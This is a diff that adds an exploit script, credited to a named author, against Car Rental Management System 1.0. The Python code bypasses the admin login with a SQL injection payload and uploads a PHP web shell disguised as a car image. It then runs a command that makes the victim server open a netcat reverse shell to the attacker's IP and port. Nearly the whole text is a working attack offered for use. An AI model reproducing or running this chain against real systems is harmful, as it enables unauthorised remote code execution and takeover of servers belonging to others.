@@ -1,0 +1,87 @@
+# Exploit Title: Car Rental Management System 1.0 - SQL injection + Arbitrary File Upload
+# Date: 09-11-2020
+# Exploit Author: Fortunato Lodari [fox at thebrain dot net]
+# Vendor Homepage: https://www.sourcecodester.com/php/14544/car-rental-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14544&title=Car+Rental+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: Debian 10 with apache2
+
+# This script will perform an automatic login using sql injection "'OR 1 = 1 limit 1 #" and will create a new car
+# in the archive, assigning a PHP file instead of the image of the car itself. This car, having "AAAAAAAAAAA"
+# as a brand, will be the first among those displayed and we will use the file just uploaded with a phpshell
+# on the victim system
+#
+# on the Attacker machine you must listen with NC on a port
+
+import sys
+import requests
+import time
+import random
+import http.cookiejar
+import os.path
+from os import path
+#foxlox#
+
+
+
+payload = {"username":"' OR 1=1 limit 1#","password":"moana"}
+
+proxies = { "http": "http://localhost:8080"}
+
+#payload = "username=' OR 1=1 limit 1 #&password=ciao"
+
+def deb(str):
+    print("Debug => "+str)
+
+def login():
+    deb("Login...")
+    session=requests.Session()
+    url = mainurl+"/admin/ajax.php?action=login"
+    #{'user-agent':'cagnolo','Referer':'http://192.168.0.130/car_rental/admin/login.php'}
+    r=session.post(url,payload, allow_redirects=False,proxies=proxies)
+    cookie = r.headers["Set-Cookie"]
+    deb(cookie)
+    return cookie
+
+def find_all(a_str, sub,lbegin,lend):
+    start = 0
+    start = a_str.find(sub, start)
+    t=(a_str[start+lbegin:start+lend]).replace('"','')
+    return t
+
+
+def upload(c):
+    deb("Getting cookie")
+    c = c.split("=");cookie={c[0]:c[1]}
+    deb("Sending payload")
+    filetosend=files = {'img': ('s_hell.php', '<?php\necho system($_GET["cmd"]);\n?>\n')}
+    fields={"id":"", "brand":"aaaAAAAAAAAAAAAAA", "model":"model", "category_id":"3", "engine_id":"1", "transmission_id":"2", "description":"description", "price":"0", "qty":"0", "img":""}
+    r=requests.post(mainurl+'/admin/ajax.php?action=save_car',fields,cookies=cookie,allow_redirects=False,files=filetosend)
+    deb("Saved Machine");
+    r=requests.get(mainurl+'/admin/index.php?page=cars', cookies=cookie,allow_redirects=False)
+    mid=find_all(r.content,'data-id=',8,11)
+    deb("Machine id: "+mid)
+    r=requests.get(mainurl+'/admin/index.php?page=manage_car&id='+mid, cookies=cookie,allow_redirects=False)
+    defurl=(find_all(r.content,"assets/uploads/cars_img",0,45))
+    deb("Exploit url: "+defurl)
+    #os.system("firefox "+mainurl+"/admin/"+defurl+"?cmd=id")
+    exploit = "wget '"+mainurl+"/admin/"+defurl+'?cmd=nc '+sys.argv[2]+" "+sys.argv[3]+" -e /bin/bash' -O /dev/null"
+    print("Opening url: "+exploit)
+    print("Don't forget to run: nc -nvlp "+sys.argv[3])
+    os.system(exploit)
+
+
+def usage():
+    if len(sys.argv) < 4:
+        print("Create a PHPShell for Car Rental Management System")
+        print("example:")
+        print("python exploit_CMS_Car_management_system.py URL_BASE YOURIP YOURPORT")
+        exit()
+
+
+    
+usage()
+mainurl = sys.argv[1]
+upload(login())
+
+#fox
